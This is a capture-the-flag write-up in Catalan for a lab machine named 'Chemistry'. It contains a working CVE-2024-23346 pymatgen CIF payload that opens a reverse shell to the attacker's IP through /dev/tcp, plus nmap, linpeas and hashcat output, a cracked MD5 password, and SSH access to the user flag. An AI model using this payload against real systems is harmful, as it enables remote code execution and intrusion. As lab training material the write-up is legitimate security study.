Primer de tot fem un nmap per veure els ports que hi ha oberts a la màquina víctima:

```
──(polkali㉿kaliPol)-[~]
└─$ nmap -sC -sV -v 10.10.11.38         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 19:09 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
Initiating NSE at 19:09
Completed NSE at 19:09, 0.01s elapsed
Initiating Ping Scan at 19:09
Scanning 10.10.11.38 [2 ports]
Completed Ping Scan at 19:09, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:09
Completed Parallel DNS resolution of 1 host. at 19:09, 0.01s elapsed
Initiating Connect Scan at 19:09
Scanning 10.10.11.38 [1000 ports]
Discovered open port 22/tcp on 10.10.11.38
Discovered open port 5000/tcp on 10.10.11.38
Completed Connect Scan at 19:09, 2.11s elapsed (1000 total ports)
Initiating Service scan at 19:09
Scanning 2 services on 10.10.11.38
Completed Service scan at 19:10, 95.12s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.38.
Initiating NSE at 19:10
Completed NSE at 19:10, 1.63s elapsed
Initiating NSE at 19:10
Completed NSE at 19:10, 1.10s elapsed
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
Nmap scan report for 10.10.11.38
Host is up (0.060s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Mon, 04 Nov 2024 18:09:13 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=11/4%Time=67290DC5%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\
SF:x20Python/3\.9\.5\r\nDate:\x20Mon,\x2004\x20Nov\x202024\x2018:09:13\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemis
SF:try\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x2
SF:0\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class=
SF:\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\">
SF:Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>W
SF:elcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\x
SF:20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20In
SF:formation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20c
SF:ontained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class
SF:=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center>
SF:<a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">Re
SF:gister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x
SF:20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBL
SF:IC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x2
SF:0\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Cont
SF:ent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\
SF:n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20r
SF:esponse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400<
SF:/p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20v
SF:ersion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Err
SF:or\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20re
SF:quest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20<
SF:/body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.83 seconds

```

Ens trobem amb el port 22 obert per SSH i el port 5000 hi ha Werkzeug que és una completa biblioteca d'aplicacions web WSGI, hi podem accedir a través d'un navegador, i ho sabem perquè ens dona un 200 per HTTP. Va començar com una simple col·lecció de diverses utilitats per a aplicacions WSGI i s'ha convertit en una de les biblioteques d'utilitats WSGI més avançades.

Ara provarem d'accedir a la pàgina pel port 5000 i ens trobem això (ara afegeixo també chemistry.htb al fitxer /etc/hosts):

![[Pasted image 20241104191705.png]]

Veiem que hi ha un analitzador CIF, una eina especialitzada destinada a l'anàlisi dels fitxers CIF. Sembla que aquesta eina analítica dóna funcionalitats que faciliten l'avaluació de la integritat i la qualitat de les dades.

Com que ens podem registrar o bé iniciar sessió, provarem de crear-nos un compte.

![[Pasted image 20241104192354.png]]

Un cop registrats, tenim una pàgina que ens permet pujar fitxers CIF:

![[Pasted image 20241104193206.png]]

Com que no sé que són els fitxers CIF he buscat per internet hi he trobat que són Arxiu d'Informació Cristalogràfica i és el format estàndard per facilitar l'intercanvi de dades cristal·logràfiques i va ser publicat per primera vegada per Hall, Allen i Brown el 1991.

El seu ús principal: Unió Internacional de Cristal·lografia (IUCr) ha triat el format de fitxer CIF com a estàndard per emmagatzemar i compartir informació cristal·logràfica. 

Pel que veiem, sembla que haurem de trobar la manera i forma de modificar i explotar fitxers CIF per poder obtenir una reverse shell. 

Al propi dashboard hi ha un exemple a descarregar d'un fitxer CIF:

![[Pasted image 20241104193303.png]]

Després de no saber ben bé què fer amb aquest fitxer CIF, he pensat que podria buscar patrons que resultin en algun exploit dels fitxers CIF, d'aquest en concret.

Després de donar vàries voltes per internet i durant força hores, veig una persona que ja havia fet aquesta màquina que ha trobat com a través d'aquest CVE: https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0  fa un fitxer CIF amb el següent codi que conté una descripció de l'estructura CIF però amb una ordre incrustada que intenta aprofitar la resolució d'atributs de Python per crear una reverse shell. 

Aquí podem trobar més informació al respecte: [https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0](https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0) i aquí https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f

Llavors, hem d'afegir al fitxer d'exemple descarregat, l'example.cif aquestes línies a sota de tot, posant la nostra IP i el port per on escoltarem per crear la reverse shell:

```
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.146/4444 0>&1\'");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```


Un cop fet això pugem el fitxer al dashboard una vegada ja tinguem una consola escoltant:

```
`┌──(polkali㉿kaliPol)-[~]
└─$ nc -nlvp 4444              
listening on [any] 4444 ...`
```

Un cop hem pujat el fitxer modificat hem de clicar a View i és quan se'ns crearà la reverse shell:

![[Pasted image 20241104201402.png]]

```
`┌──(polkali㉿kaliPol)-[~]
└─$ nc -nlvp 4444              
listening on [any] 4444 ...
connect to [10.10.14.146] from (UNKNOWN) [10.10.11.38] 53120
sh: 0: can't access tty; job control turned off
$ whoami
app
$ id
uid=1001(app) gid=1001(app) groups=1001(app)
$ `
```

Després de força investigació, veig que la user flag es troba al directori d'un altre usuari que hi ha, que es diu rosa, però no podem llegir la flag amb l'usuari app que estem, per tant hem de trobar les credencials de l'usuari rosa:

```
$ ls -la rosa
total 876
drwxr-xr-x 7 rosa rosa   4096 Nov  4 19:16 .
drwxr-xr-x 4 root root   4096 Jun 16 23:10 ..
lrwxrwxrwx 1 root root      9 Jun 17 01:50 .bash_history -> /dev/null
-rw-r--r-- 1 rosa rosa    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 rosa rosa   3771 Feb 25  2020 .bashrc
drwx------ 2 rosa rosa   4096 Jun 15 20:38 .cache
drwxrwxr-x 4 rosa rosa   4096 Nov  4 16:21 CVE-2021-3156
-rwxrw-r-- 1 rosa rosa    462 Nov  4 19:15 exploit.sh
drwx------ 3 rosa rosa   4096 Nov  4 18:50 .gnupg
-rwxrwxr-x 1 rosa rosa 847834 Nov  4 16:09 linpeas.sh
drwxrwxr-x 4 rosa rosa   4096 Jun 16 16:04 .local
-rw-r--r-- 1 rosa rosa    807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root      9 Jun 17 01:51 .sqlite_history -> /dev/null
drwx------ 2 rosa rosa   4096 Jun 15 18:24 .ssh
-rw-r--r-- 1 rosa rosa      0 Jun 15 20:43 .sudo_as_admin_successful
-rw-r----- 1 root rosa     33 Nov  4 15:36 user.txt
$ cd rosa
$ cat user.txt
cat: user.txt: Permission denied
$ 
```

 Veiem que hi ha Linpeas, per tant aprofitem per executar-lo ja que podem si ens fixem en els permisos:

![[Pasted image 20241104212705.png]]

Gràcies a Linpeas veiem que hi ha el fitxer ``/home/app/instance/database.db`` que sembla prometedor ja que Linpeas ens el marca com a taula llegible de BD:

![[Pasted image 20241104214853.png]]

I aquí dins veiem que hi ha en format hash les password dels usuaris ja que si ens hi fixem bé, hi apareix l'usuari pol que he creat per poder pujar fitxers CIF al servidor a través del dashboard.

Ara, gràcies a trobar el hash de la password de l'usuari rosa: ``63ed86ee9f624c7b14f1d4f43dc251a5`` mirarem de crackejar-lo. Primer el desem a un fitxer hash:

``echo '63ed86ee9f624c7b14f1d4f43dc251a5' > hash``

I ara crackejem el hash d'aquest fitxer amb hashcat:
 
```
`┌──(polkali㉿kaliPol)-[~/Documents/Chemistry]
└─$ hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2212/4489 MB (1024 MB allocatable), 3MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 63ed86ee9f624c7b14f1d4f43dc251a5
Time.Started.....: Mon Nov  4 21:41:22 2024 (1 sec)
Time.Estimated...: Mon Nov  4 21:41:23 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3969.7 kH/s (0.11ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2982912/14344385 (20.79%)
Rejected.........: 0/2982912 (0.00%)
Restore.Point....: 2981376/14344385 (20.78%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: unikkatilgsgs -> ungidas07
Hardware.Mon.#1..: Util: 53%

Started: Mon Nov  4 21:40:46 2024
Stopped: Mon Nov  4 21:41:25 2024`
```

I obtenim la password amb la qual intentarem connectar-nos amb l'usuari rosa per ssh per poder llegir la user flag:

```
┌──(polkali㉿kaliPol)-[~]
└─$ ssh rosa@10.10.11.38                              
The authenticity of host '10.10.11.38 (10.10.11.38)' can't be established.
ED25519 key fingerprint is SHA256:pCTpV0QcjONI3/FCDpSD+5DavCNbTobQqcaz7PC6S8k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.38' (ED25519) to the list of known hosts.
rosa@10.10.11.38's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 04 Nov 2024 08:44:45 PM UTC

  System load:  0.01              Processes:             269
  Usage of /:   84.9% of 5.08GB   Users logged in:       1
  Memory usage: 36%               IPv4 address for eth0: 10.10.11.38
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Nov  4 20:41:09 2024 from 10.10.16.71
rosa@chemistry:~$ id
uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)
rosa@chemistry:~$ whoami
rosa
rosa@chemistry:~$ pwd
/home/rosa
rosa@chemistry:~$ cat user.txt 
f5d75176ef10de4d12a98afd62e27f56
rosa@chemistry:~$ 

```

I ja tenim la user flag:

![image](https://github.com/user-attachments/assets/7cbd0c2a-658a-463f-ac09-9bee684dae03)

Ara buscarem la forma d'escalar privilegis per poder tenir accés amb l'usuari root i obtenir la seva flag.

